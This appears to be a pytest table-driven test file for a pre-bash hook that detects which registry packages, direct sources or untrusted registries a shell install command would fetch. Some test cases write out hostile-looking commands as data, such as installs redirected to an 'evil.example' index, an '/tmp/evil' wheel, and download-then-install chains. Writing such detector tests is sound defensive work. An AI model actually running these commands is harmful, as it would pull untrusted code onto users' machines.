"""Table-driven tests for what the pre-bash hook thinks a command installs.

Each case is (command, expected targets). A target is written as
``kind:ecosystem`` for direct/dynamic/local/manifest targets and as
``ecosystem:name`` (``==version`` when pinned exactly, ``@registry`` when the
command points the tool at another index) for registry packages.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from skylos.commands.hook_install_parse import (
    DIRECT,
    REGISTRY,
    install_targets,
    looks_like_install,
)


@pytest.fixture(autouse=True)
def no_global_npm_bins(monkeypatch):
    # Hermetic: globally installed npm binaries on the test machine must not
    # turn "npx cowsay" into a local run.
    monkeypatch.setattr("skylos.commands.hook_install_parse._global_bin_dirs", list)


@pytest.fixture(scope="module")
def project(tmp_path_factory) -> Path:
    root = tmp_path_factory.mktemp("proj")
    (root / ".git").mkdir()
    bins = root / "node_modules" / ".bin"
    bins.mkdir(parents=True)
    for name in ("tsc", "eslint", "prettier", "vitest", "jest", "next"):
        (bins / name).write_text("#!/bin/sh\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    (root / "web").mkdir()
    return root


def summary(command: str, root: Path, cwd: Path | None = None) -> list[str]:
    out = []
    for target in install_targets(command, cwd or root, root=root):
        if target.kind == REGISTRY:
            text = f"{target.ecosystem}:{target.name}"
            if target.version:
                text += f"=={target.version}"
            if target.registries:
                text += "@reg"
            out.append(text)
        else:
            out.append(f"{target.kind}:{target.ecosystem}")
    return out


# --------------------------------------------------------------------------
# Positives: registry packages the command would fetch
# --------------------------------------------------------------------------

REGISTRY_CASES = [
    # pip and friends
    ("pip install requests", ["PyPI:requests"]),
    ("pip3 install requests flask", ["PyPI:requests", "PyPI:flask"]),
    ("pip3.12 install httpx", ["PyPI:httpx"]),
    ("pip install requests==2.31.0", ["PyPI:requests==2.31.0"]),
    ("pip install 'requests>=2,<3'", ["PyPI:requests"]),
    (
        "pip install 'numpy<2' \"pandas[performance]>=2.1\"",
        ["PyPI:numpy", "PyPI:pandas"],
    ),
    ("pip install fastapi[standard]", ["PyPI:fastapi"]),
    ("pip install 'uvicorn[standard]==0.30.1'", ["PyPI:uvicorn==0.30.1"]),
    ("pip install 'black==24.*'", ["PyPI:black"]),
    ("pip install pkg===1.0", ["PyPI:pkg==1.0"]),
    (
        "pip install -U pip setuptools wheel",
        ["PyPI:pip", "PyPI:setuptools", "PyPI:wheel"],
    ),
    ("pip install -qU langchain", ["PyPI:langchain"]),
    ("pip install --upgrade --no-cache-dir torch", ["PyPI:torch"]),
    ("pip install --user --break-system-packages rich", ["PyPI:rich"]),
    ("pip install --progress-bar off tqdm", ["PyPI:tqdm"]),
    ("pip install --target ./vendor six", ["PyPI:six"]),
    ("pip install -t vendor six", ["PyPI:six"]),
    ("pip install --timeout 60 --retries 3 boto3", ["PyPI:boto3"]),
    ("pip install --only-binary :all: lxml", ["PyPI:lxml"]),
    ("pip install --no-binary=:all: psycopg2", ["PyPI:psycopg2"]),
    ("pip install -c constraints.txt django", ["PyPI:django"]),
    ("pip --disable-pip-version-check install attrs", ["PyPI:attrs"]),
    ("pip -q install attrs", ["PyPI:attrs"]),
    ("pip install 'foo; python_version < \"3.8\"'", ["PyPI:foo"]),
    ("pip install foo -r requirements.txt", ["manifest:PyPI", "PyPI:foo"]),
    ("python -m pip install requests", ["PyPI:requests"]),
    ("python3 -m pip install --upgrade pip", ["PyPI:pip"]),
    ("python3.11 -m pip install pydantic", ["PyPI:pydantic"]),
    ("py -3.12 -m pip install pytest", ["PyPI:pytest"]),
    ("python -I -m pip install six", ["PyPI:six"]),
    ("sudo pip install ansible", ["PyPI:ansible"]),
    ("sudo -H pip3 install awscli", ["PyPI:awscli"]),
    ("uv pip install ruff", ["PyPI:ruff"]),
    ("uv pip install --system 'ruff==0.6.0' mypy", ["PyPI:ruff==0.6.0", "PyPI:mypy"]),
    ("uv add httpx 'fastapi[standard]'", ["PyPI:httpx", "PyPI:fastapi"]),
    ("uv add --dev pytest pytest-cov", ["PyPI:pytest", "PyPI:pytest-cov"]),
    ("uv add --group lint ruff", ["PyPI:ruff"]),
    ("uv add --optional viz matplotlib", ["PyPI:matplotlib"]),
    ("uv add --package api sqlalchemy", ["PyPI:sqlalchemy"]),
    ("uv --directory backend add celery", ["PyPI:celery"]),
    ("uv tool install black", ["PyPI:black"]),
    (
        "uv tool install --with mkdocs-material mkdocs",
        ["PyPI:mkdocs-material", "PyPI:mkdocs"],
    ),
    ("uv tool run ruff check .", ["PyPI:ruff"]),
    ("uvx ruff check .", ["PyPI:ruff"]),
    ("uvx ruff@0.6.0 check", ["PyPI:ruff==0.6.0"]),
    ("uvx ruff@latest format", ["PyPI:ruff"]),
    ("uvx 'ruff==0.5.7' check", ["PyPI:ruff==0.5.7"]),
    ("uvx --from httpie http GET example.com", ["PyPI:httpie"]),
    ("uvx --from 'mypy==1.10' mypy src", ["PyPI:mypy==1.10"]),
    ("uvx --with pytest-cov pytest -q", ["PyPI:pytest-cov", "PyPI:pytest"]),
    ("uvx --python 3.12 pycowsay hi", ["PyPI:pycowsay"]),
    ("uvx -p 3.11 black .", ["PyPI:black"]),
    ("uv run --with rich python x.py", ["PyPI:rich"]),
    ("uv run --with 'rich,httpx>=0.27,<1' python x.py", ["PyPI:rich", "PyPI:httpx"]),
    ("uv run --with jupyter jupyter lab", ["PyPI:jupyter"]),
    (
        'uvx --with "rdflib-endpoint[cli,oxigraph]" rdflib-endpoint',
        ["PyPI:rdflib-endpoint", "PyPI:rdflib-endpoint"],
    ),
    (
        "uvx --from ty==0.0.17 --with .[gui,cli] --with tomli ty check",
        ["local:PyPI", "PyPI:tomli", "PyPI:ty==0.0.17"],
    ),
    ("poetry add requests", ["PyPI:requests"]),
    (
        "poetry add pendulum@^2.0.5 requests@2.31.0",
        ["PyPI:pendulum", "PyPI:requests==2.31.0"],
    ),
    ("poetry add --group dev pytest@latest", ["PyPI:pytest"]),
    ("poetry add 'httpx>=0.27'", ["PyPI:httpx"]),
    ("pdm add requests", ["PyPI:requests"]),
    ("pdm add -G test pytest", ["PyPI:pytest"]),
    ("pipenv install requests", ["PyPI:requests"]),
    ("pipenv install --dev pytest", ["PyPI:pytest"]),
    ("pipx install poetry", ["PyPI:poetry"]),
    ("pipx install --python python3.12 black", ["PyPI:black"]),
    ("pipx install --preinstall pytest-cov pytest", ["PyPI:pytest-cov", "PyPI:pytest"]),
    ("pipx run cowsay hi", ["PyPI:cowsay"]),
    ("pipx run --spec 'black==24.4.0' black .", ["PyPI:black==24.4.0"]),
    ("pipx inject poetry poetry-plugin-export", ["PyPI:poetry-plugin-export"]),
    ("python -m pipx run pycowsay", ["PyPI:pycowsay"]),
    # npm family
    ("npm install lodash", ["npm:lodash"]),
    ("npm i lodash", ["npm:lodash"]),
    ("npm add zod", ["npm:zod"]),
    ("npm isntall chalk", ["npm:chalk"]),
    (
        "npm i -D @types/node@20 typescript@5.4.5",
        ["npm:@types/node", "npm:typescript==5.4.5"],
    ),
    ("npm install --save-dev eslint prettier", ["npm:eslint", "npm:prettier"]),
    ("npm install -g pnpm@9.1.0", ["npm:pnpm==9.1.0"]),
    ("npm install --global yarn", ["npm:yarn"]),
    ("npm i react@^18.2.0 react-dom@18", ["npm:react", "npm:react-dom"]),
    ("npm i next@latest", ["npm:next"]),
    ("npm i @scope/pkg@1.2.3-beta.1", ["npm:@scope/pkg==1.2.3-beta.1"]),
    ("npm install --legacy-peer-deps @mui/material", ["npm:@mui/material"]),
    ("npm install --loglevel silent left-pad", ["npm:left-pad"]),
    ("npm install --before 2024-01-01 axios", ["npm:axios"]),
    ("npm install -w packages/web vite", ["npm:vite"]),
    ("npm install --workspace web vite", ["npm:vite"]),
    ("npm install --fund false express", ["npm:express"]),
    ("npm --prefix ./web install vue", ["npm:vue"]),
    ("npm i foo@npm:bar@1.0.0", ["npm:bar==1.0.0"]),
    ("npm i string-width-cjs@npm:string-width@^4.2.0", ["npm:string-width"]),
    ("npm install-test lodash", ["npm:lodash"]),
    ("npx -y create-next-app@latest my-app --ts", ["npm:create-next-app"]),
    ("npx cowsay hello", ["npm:cowsay"]),
    (
        "npx --yes @modelcontextprotocol/server-filesystem /tmp",
        ["npm:@modelcontextprotocol/server-filesystem"],
    ),
    ("npx -p typescript tsc --init", ["npm:typescript"]),
    ("npx --package=@angular/cli ng new app", ["npm:@angular/cli"]),
    ("npx -p yo -p generator-code yo code", ["npm:yo", "npm:generator-code"]),
    ("npx tsc@5.4.5 --version", ["npm:tsc==5.4.5"]),
    ("npm exec --package=@angular/cli -- ng new app", ["npm:@angular/cli"]),
    ("npm exec -- cowsay hi", ["npm:cowsay"]),
    ("npm x -y degit user/repo app", ["npm:degit"]),
    ("npm create vite@latest my-app -- --template react", ["npm:create-vite"]),
    ("npm init react-app my-app", ["npm:create-react-app"]),
    ("npm init @vitejs/app", ["npm:@vitejs/create-app"]),
    ("npm init @scope", ["npm:@scope/create"]),
    ("npm create svelte@5.0.1 app", ["npm:create-svelte==5.0.1"]),
    ("pnpm add zod", ["npm:zod"]),
    (
        "pnpm add -D vitest @vitest/coverage-v8",
        ["npm:vitest", "npm:@vitest/coverage-v8"],
    ),
    ("pnpm --filter web add react", ["npm:react"]),
    ("pnpm -F api add fastify", ["npm:fastify"]),
    ("pnpm -C apps/web add clsx", ["npm:clsx"]),
    ("pnpm add -g turbo", ["npm:turbo"]),
    ("pnpm i dayjs", ["npm:dayjs"]),
    ("pnpm dlx shadcn@latest add button", ["npm:shadcn"]),
    ("pnpm dlx create-turbo@2.0.0", ["npm:create-turbo==2.0.0"]),
    ("pnpm dlx --package=typescript tsc --init", ["npm:typescript"]),
    ("pnpm create vite my-app", ["npm:create-vite"]),
    ("pnpx prisma generate", ["npm:prisma"]),
    ("yarn add axios", ["npm:axios"]),
    ("yarn add -D @types/react", ["npm:@types/react"]),
    ("yarn global add serve", ["npm:serve"]),
    ("yarn workspace web add react-dom", ["npm:react-dom"]),
    ("yarn --cwd web add clsx", ["npm:clsx"]),
    ("yarn dlx create-react-app app", ["npm:create-react-app"]),
    ("yarn dlx -p typescript tsc", ["npm:typescript"]),
    ("yarn create next-app", ["npm:create-next-app"]),
    ("bun add zod", ["npm:zod"]),
    ("bun add -d @types/bun", ["npm:@types/bun"]),
    ("bun a hono", ["npm:hono"]),
    ("bun install elysia", ["npm:elysia"]),
    ("bun i -g @anthropic-ai/claude-code", ["npm:@anthropic-ai/claude-code"]),
    ("bunx cowsay hi", ["npm:cowsay"]),
    ("bunx --bun vite", ["npm:vite"]),
    ("bun x create-hono my-app", ["npm:create-hono"]),
    ("bun create next-app", ["npm:create-next-app"]),
    # go
    ("go install golang.org/x/tools/gopls@latest", ["Go:golang.org/x/tools/gopls"]),
    ("go install github.com/air-verse/air@v1.52.0", ["Go:github.com/air-verse/air"]),
    ("go get github.com/gorilla/mux", ["Go:github.com/gorilla/mux"]),
    (
        "go get -u github.com/stretchr/testify@v1.9.0",
        ["Go:github.com/stretchr/testify"],
    ),
    ("go get example.com/mod/...@v1", ["Go:example.com/mod"]),
    (
        "go run github.com/air-verse/air@v1.52.0 -c .air.toml",
        ["Go:github.com/air-verse/air"],
    ),
    (
        "go run -mod=mod golang.org/x/vuln/cmd/govulncheck@latest ./...",
        ["Go:golang.org/x/vuln/cmd/govulncheck"],
    ),
    (
        "go install -v honnef.co/go/tools/cmd/staticcheck@2024.1.1",
        ["Go:honnef.co/go/tools/cmd/staticcheck"],
    ),
    # deno
    ("deno run -A npm:create-vite@latest", ["npm:create-vite"]),
    ("deno run --allow-net npm:cowsay@1.6.0/cowthink hi", ["npm:cowsay==1.6.0"]),
    ("deno add jsr:@std/path npm:chalk", ["JSR:@std/path", "npm:chalk"]),
    ("deno add @std/assert", ["JSR:@std/assert"]),
    ("deno install -g -A jsr:@deno/deployctl", ["JSR:@deno/deployctl"]),
    # wrappers, chains, env prefixes, nesting
    ("FOO=1 npm i left-pad", ["npm:left-pad"]),
    ("CI=true pnpm add zod && pnpm test", ["npm:zod"]),
    ("cd web && npm install axios", ["npm:axios"]),
    ("npm ci; npm i -D vitest@1.6.0", ["npm:vitest==1.6.0"]),
    ("pip install a || pip install b", ["PyPI:a", "PyPI:b"]),
    ("bash -c 'pip install rich'", ["PyPI:rich"]),
    ('bash -lc "npm i lodash && npx cowsay hi"', ["npm:lodash", "npm:cowsay"]),
    ("sh -c 'uvx ruff check'", ["PyPI:ruff"]),
    ("timeout 60 npx -y create-vite app", ["npm:create-vite"]),
    ("env PYTHONUNBUFFERED=1 pip install six", ["PyPI:six"]),
    ("time pip install six", ["PyPI:six"]),
    ("nohup npx http-server &", ["npm:http-server"]),
    ("echo ok && (cd web && pnpm add zod)", ["npm:zod"]),
    ("if ! command -v ruff; then pipx install ruff; fi", ["PyPI:ruff"]),
    ("result=$(npx -y cowsay hi)", ["npm:cowsay"]),
    ("eval 'pip install six'", ["PyPI:six"]),
    ("pip install six # install six", ["PyPI:six"]),
    ("pip install six\nnpm i lodash", ["PyPI:six", "npm:lodash"]),
    (
        "pip install \\\n  requests \\\n  'flask[async]'",
        ["PyPI:requests", "PyPI:flask"],
    ),
    ("npm i \\\n  left-pad", ["npm:left-pad"]),
    ('uv run --with "pydantic-ai[examples]" \\', ["PyPI:pydantic-ai"]),
]


@pytest.mark.parametrize("command,expected", REGISTRY_CASES)
def test_registry_targets(project, command, expected):
    assert summary(command, project) == expected


# --------------------------------------------------------------------------
# Direct sources, registry overrides, dynamic names
# --------------------------------------------------------------------------

SOURCE_CASES = [
    ("npm install github:cline/cline#b181e0", ["direct:npm"]),
    ("npm install expressjs/express", ["direct:npm"]),
    ("npm i user/repo#main", ["direct:npm"]),
    ("npm install git+https://github.com/user/repo.git", ["direct:npm"]),
    ("npm install git+ssh://git@github.com/user/repo.git", ["direct:npm"]),
    ("npm install git@github.com:user/repo.git", ["direct:npm"]),
    ("npm install https://example.com/pkg-1.0.0.tgz", ["direct:npm"]),
    ("npm install gitlab:group/project", ["direct:npm"]),
    ("npm install bitbucket:team/repo", ["direct:npm"]),
    ("npm i mypkg@github:user/repo", ["direct:npm"]),
    ("npm i mypkg@https://example.com/x.tgz", ["direct:npm"]),
    ("yarn add exec:./gen.js", ["direct:npm"]),
    ("pnpm add github:user/repo", ["direct:npm"]),
    ("bun add user/repo", ["direct:npm"]),
    ("bun create user/template app", ["direct:npm"]),
    ("npx github:user/repo", ["direct:npm"]),
    ("npx https://example.com/tool.tgz", ["direct:npm"]),
    ("pnpm dlx github:user/tool", ["direct:npm"]),
    ("pip install git+https://github.com/psf/requests@main", ["direct:PyPI"]),
    ("pip install 'pkg @ git+https://github.com/x/y'", ["direct:PyPI"]),
    ("pip install pkg@git+https://github.com/x/y", ["direct:PyPI"]),
    ("pip install https://example.com/x-1.0.tar.gz", ["direct:PyPI"]),
    ("pip install https://example.com/x-1.0-py3-none-any.whl", ["direct:PyPI"]),
    ("pip install hg+https://hg.example.com/repo", ["direct:PyPI"]),
    ("pip install -e git+https://github.com/x/y#egg=y", ["direct:PyPI"]),
    ("pip install -r https://example.com/requirements.txt", ["direct:PyPI"]),
    ("uv add git+https://github.com/encode/httpx", ["direct:PyPI"]),
    ("uv pip install 'httpx @ https://example.com/httpx.whl'", ["direct:PyPI"]),
    ("uvx --from git+https://github.com/x/y tool", ["direct:PyPI"]),
    ("uv tool install git+https://github.com/x/y", ["direct:PyPI"]),
    ("pipx install git+https://github.com/x/y.git", ["direct:PyPI"]),
    ("pipx run --spec git+https://github.com/x/y tool", ["direct:PyPI"]),
    ("poetry add git+https://github.com/x/y.git", ["direct:PyPI"]),
    ("deno run https://deno.land/std/examples/welcome.ts", ["direct:npm"]),
    ("deno install -g https://example.com/cli.ts", ["direct:npm"]),
    ("curl -LO https://x.example/y.tgz && npm i ./y.tgz", ["direct:npm"]),
    ("wget https://x.example/p.whl && pip install ./p.whl", ["direct:PyPI"]),
    ("pip install /tmp/evil-1.0-py3-none-any.whl", ["direct:PyPI"]),
    ("npm install /tmp/pkg.tgz", ["direct:npm"]),
    # untrusted alternate registries: registry packages marked @reg
    (
        "pip install --index-url https://pypi.corp.example/simple internal",
        ["PyPI:internal@reg"],
    ),
    ("pip install -i https://evil.example/simple requests", ["PyPI:requests@reg"]),
    (
        "pip install --extra-index-url https://download.pytorch.org/whl/cu121 torch",
        ["PyPI:torch@reg"],
    ),
    ("pip install -f https://example.com/wheels pkg", ["PyPI:pkg@reg"]),
    ("PIP_INDEX_URL=https://corp.example/simple pip install x", ["PyPI:x@reg"]),
    ("UV_INDEX_URL=https://corp.example/simple uv pip install x", ["PyPI:x@reg"]),
    ("uv add --index corp=https://corp.example/simple x", ["PyPI:x@reg"]),
    ("uvx --index-url https://corp.example/simple tool", ["PyPI:tool@reg"]),
    ("pipx install --pip-args='--index-url https://corp/simple' foo", ["PyPI:foo@reg"]),
    ("npm install --registry https://npm.corp.example foo", ["npm:foo@reg"]),
    ("npm install --registry=https://npm.corp.example foo", ["npm:foo@reg"]),
    ("NPM_CONFIG_REGISTRY=https://evil.example npm i foo", ["npm:foo@reg"]),
    ("npm_config_registry=https://evil.example npx foo", ["npm:foo@reg"]),
    ("export npm_config_registry=https://evil.example; npm i foo", ["npm:foo@reg"]),
    (
        "npm install --@corp:registry=https://npm.corp.example @corp/ui",
        ["npm:@corp/ui@reg"],
    ),
    ("GOPROXY=https://corp.example go get example.com/x", ["Go:example.com/x@reg"]),
    ("GOSUMDB=off go install example.com/tool@latest", ["Go:example.com/tool@reg"]),
    # public registries named explicitly are not overrides
    ("pip install -i https://pypi.org/simple requests", ["PyPI:requests"]),
    ("npm install --registry https://registry.npmjs.org/ lodash", ["npm:lodash"]),
    ("yarn add --registry https://registry.yarnpkg.com lodash", ["npm:lodash"]),
    (
        "GOPROXY=https://proxy.golang.org,direct go get example.com/x",
        ["Go:example.com/x"],
    ),
    # names only known at run time
    ("pip install $PKG", ["dynamic:PyPI"]),
    ('pip install "$PACKAGE"', ["dynamic:PyPI"]),
    ("npm i ${DEP}", ["dynamic:npm"]),
    ("npm install $(cat deps.txt)", ["dynamic:npm"]),
    ("cat deps.txt | xargs npm i", ["dynamic:npm"]),
    ("xargs -n1 pip install < reqs.txt", ["dynamic:PyPI"]),
    ("npx $TOOL", ["dynamic:npm"]),
    ("uvx $TOOL check", ["dynamic:PyPI"]),
    ("go install $MODULE@latest", ["dynamic:Go"]),
    ("npm i @types/{node,react}", ["dynamic:npm"]),
    ("pip install -r $REQS", ["dynamic:PyPI"]),
    ("pip install 'not a valid spec'", ["dynamic:PyPI"]),
]


@pytest.mark.parametrize("command,expected", SOURCE_CASES)
def test_direct_override_and_dynamic_targets(project, command, expected):
    assert summary(command, project) == expected


# --------------------------------------------------------------------------
# Negatives: normal dev commands that fetch nothing from a registry
# --------------------------------------------------------------------------

NO_FETCH_CASES = [
    ("ls -la", []),
    ("git status", []),
    ("git commit -m 'pip install foo'", []),
    ('git commit -m "npm i left-pad"', []),
    ("echo 'npm install foo'", []),
    ("echo pip install foo", []),
    ("grep -rn 'npm install' docs/", []),
    ("rg 'pip install' README.md", []),
    ("cat package.json", []),
    ("npm install", []),
    ("npm i", []),
    ("npm ci", []),
    ("npm ci --ignore-scripts", []),
    ("npm install --frozen-lockfile", []),
    ("npm run build", []),
    ("npm test", []),
    ("npm run lint -- --fix", []),
    ("npm view lodash version", []),
    ("npm ls react", []),
    ("npm outdated", []),
    ("npm update", []),
    ("npm uninstall lodash", []),
    ("npm audit fix", []),
    ("npm init -y", []),
    ("npm init", []),
    ("npm exec -c 'eslint .'", []),
    ("npm pack", []),
    ("npm publish --dry-run", []),
    ("pnpm install", []),
    ("pnpm i --frozen-lockfile", []),
    ("pnpm install --filter web", []),
    ("pnpm -r build", []),
    ("pnpm exec vitest run", []),
    ("pnpm run dev", []),
    ("pnpm test", []),
    ("pnpm remove zod", []),
    ("yarn", []),
    ("yarn install --immutable", []),
    ("yarn build", []),
    ("yarn test --watch", []),
    ("yarn remove axios", []),
    ("yarn workspace web build", []),
    ("bun install", []),
    ("bun run dev", []),
    ("bun test", []),
    ("bun remove zod", []),
    ("npx --no eslint .", ["local:npm"]),
    ("npx --offline prettier .", ["local:npm"]),
    ("pip install -e .", ["local:PyPI"]),
    ("pip install -e '.[dev,test]'", ["local:PyPI"]),
    ("pip install .", ["local:PyPI"]),
    ("pip install ./packages/core", ["local:PyPI"]),
    ("pip install packages/core", ["local:PyPI"]),
    ("pip install dist/pkg-1.0-py3-none-any.whl", ["local:PyPI"]),
    ("pip install -r requirements.txt", ["manifest:PyPI"]),
    (
        "pip install -r requirements-dev.txt -r requirements.txt",
        ["manifest:PyPI", "manifest:PyPI"],
    ),
    ("pip install -Ur requirements.txt", ["manifest:PyPI"]),
    ("pip install --no-index --find-links ./wheels mypkg", ["local:PyPI"]),
    ("pip list", []),
    ("pip show requests", []),
    ("pip freeze > requirements.txt", []),
    ("pip uninstall -y requests", []),
    ("pip download requests", []),
    ("python -m pytest -q", []),
    ("python setup.py install", []),
    ("python manage.py install foo", []),
    ("python -c 'import pip'", []),
    ("uv sync", []),
    ("uv sync --all-extras", []),
    ("uv lock --upgrade", []),
    ("uv run pytest", []),
    ("uv run python -m mypy .", []),
    ("uv pip sync requirements.txt", []),
    ("uv pip install -r requirements.txt", ["manifest:PyPI"]),
    ("uv pip install -e .", ["local:PyPI"]),
    ("uv add --editable ./libs/core", ["local:PyPI"]),
    ("uv add ../shared", ["local:PyPI"]),
    ("uv venv", []),
    ("uv tool list", []),
    ("uvx --offline ruff check", ["local:PyPI"]),
    ("poetry install", []),
    ("poetry install --with dev", []),
    ("poetry run pytest", []),
    ("poetry add ../mylib", ["local:PyPI"]),
    ("poetry lock", []),
    ("pdm install", []),
    ("pipenv install", []),
    ("pipenv install -r requirements.txt", ["manifest:PyPI"]),
    ("pipx list", []),
    ("pipx install .", ["local:PyPI"]),
    ("pipx install --editable .", ["local:PyPI"]),
    ("go test ./...", []),
    ("go build ./cmd/server", []),
    ("go run .", []),
    ("go run ./cmd/api", []),
    ("go run main.go", []),
    ('go run "${script_dir}/cmd/keygen" -output x', []),
    ("go mod tidy", []),
    ("go mod download", []),
    ("go get -u ./...", []),
    ("go get", []),
    ("go install ./cmd/...", []),
    ("go get go@1.22.0", []),
    ("go get toolchain@go1.22.1", []),
    ("go vet ./...", []),
    ("deno run main.ts", []),
    ("deno run --allow-read ./scripts/build.ts", []),
    ("deno test -A", []),
    ("deno task dev", []),
    ("npm install ./packages/shared", ["local:npm"]),
    ("npm install ../lib", ["local:npm"]),
    ("npm i file:../lib", ["local:npm"]),
    ("npm i ./dist/pkg-1.0.0.tgz", ["local:npm"]),
    ("pnpm add workspace:*", ["local:npm"]),
    ("pnpm add @acme/ui@workspace:*", ["local:npm"]),
    ("yarn add link:../lib", ["local:npm"]),
    ("npm install --no-save ./tarball.tgz", ["local:npm"]),
    ("make install", []),
    ("cargo build", []),
    ("docker build -t app .", []),
    ("brew list", []),
    ("which npm", []),
    ("command -v npx", []),
    ("type pip", []),
    ("npm --version", []),
    ("pip --version", []),
    ("npx --version", []),
    ("uv --version", []),
    ("go version", []),
    ("cat README.md | grep 'pip install'", []),
    ("echo $(which pip)", []),
    ("sed -i 's/npm install/npm ci/' Makefile", []),
]


@pytest.mark.parametrize("command,expected", NO_FETCH_CASES)
def test_commands_that_fetch_nothing(project, command, expected):
    assert summary(command, project) == expected


@pytest.mark.parametrize(
    "command",
    ["npx tsc --noEmit", "npx eslint .", "npx prettier --write .", "bunx vitest run",
     "npx jest --watch", "npx next build"],
)  # fmt: skip
def test_runner_uses_installed_local_binary(project, command):
    assert summary(command, project) == ["local:npm"]


def test_runner_local_binary_found_from_subdirectory(project):
    assert summary("npx tsc -p .", project, cwd=project / "web") == ["local:npm"]


def test_runner_version_request_still_fetches(project):
    # "npx tsc@5" asks for a specific version: npx may download it.
    assert summary("npx tsc@5.4.5 --version", project) == ["npm:tsc==5.4.5"]


def test_dlx_never_uses_local_binary(project):
    assert summary("pnpm dlx eslint .", project) == ["npm:eslint"]


def test_runner_without_local_binary_is_checked(project):
    assert summary("npx cowsay hi", project) == ["npm:cowsay"]


def test_archive_inside_project_is_local_and_outside_is_direct(project):
    assert summary("pip install ./dist/x-1.0.tar.gz", project) == ["local:PyPI"]
    outside = summary(f"pip install {os.sep}tmp{os.sep}x-1.0.tar.gz", project)
    assert outside == ["direct:PyPI"]


def test_runner_targets_are_marked_runs(project):
    for command in ("npx cowsay", "uvx ruff", "pipx run black", "pnpm dlx zx",
                    "bunx vite", "go run example.com/x@latest"):  # fmt: skip
        targets = install_targets(command, project, root=project)
        assert targets and all(t.runs for t in targets), command
    for command in ("npm i lodash", "pip install six", "go install example.com/x@v1"):
        targets = install_targets(command, project, root=project)
        assert targets and not any(t.runs for t in targets), command


def test_github_commit_ref_mentions_forks(project):
    (target,) = install_targets(
        "npm i github:cline/cline#b181e0", project, root=project
    )
    assert target.kind == DIRECT
    assert "cline/cline" in target.source and "fork" in target.source


def test_direct_source_message_drops_url_credentials(project):
    (target,) = install_targets(
        "pip install git+https://user:token@github.com/x/y", project, root=project
    )
    assert "token" not in target.source


def test_install_hint_prefilter():
    for command in ("pip install x", "NPM_X=1 npx foo", "uvx ruff", "bunx vite",
                    "go run x@v1", "python3 -m pip install x", "deno add jsr:@a/b",
                    "PIP.EXE install x"):  # fmt: skip
        assert looks_like_install(command), command
    for command in ("ls", "pytest -q", "git status", "cat foo.py", "make", "cargo test",
                    "npmx", "gopher", "pythonic"):  # fmt: skip
        assert not looks_like_install(command), command


def test_target_cap(project):
    command = "pip install " + " ".join(f"pkg{i}" for i in range(100))
    assert len(install_targets(command, project, root=project)) == 40


def test_unbalanced_quotes_do_not_crash(project):
    assert install_targets("pip install 'requests", project, root=project) is not None
    assert install_targets('npm i "lodash', project, root=project) is not None


def test_runner_uses_the_projects_own_bin(tmp_path):
    # npx runs a bin the project's own package.json declares (libnpmexec).
    (tmp_path / ".git").mkdir()
    (tmp_path / "package.json").write_text(
        '{"name": "@acme/knex-x", "bin": {"x-migrations": "dist/cli.cjs"}}'
    )
    assert summary("npx x-migrations migrate:latest", tmp_path) == ["local:npm"]
    (tmp_path / "package.json").write_text('{"name": "@acme/solo", "bin": "cli.js"}')
    assert summary("npx solo --help", tmp_path) == ["local:npm"]
    assert summary("npx other-tool", tmp_path) == ["npm:other-tool"]


def test_runner_finds_bins_above_the_project(tmp_path):
    bins = tmp_path / "node_modules" / ".bin"
    bins.mkdir(parents=True)
    (bins / "eslint").write_text("")
    project = tmp_path / "apps" / "web"
    (project / ".git").mkdir(parents=True)
    assert summary("npx eslint .", project) == ["local:npm"]


def test_runner_uses_global_bin(tmp_path, monkeypatch):
    (tmp_path / ".git").mkdir()
    global_bin = tmp_path / "global-bin"
    global_bin.mkdir()
    (global_bin / "serve").write_text("")
    monkeypatch.setattr(
        "skylos.commands.hook_install_parse._global_bin_dirs", lambda: [global_bin]
    )
    assert summary("npx serve dist", tmp_path) == ["local:npm"]


def test_local_version_label_checks_the_public_version(project):
    assert summary("pip install torch==1.11.0+cu113", project) == ["PyPI:torch==1.11.0"]
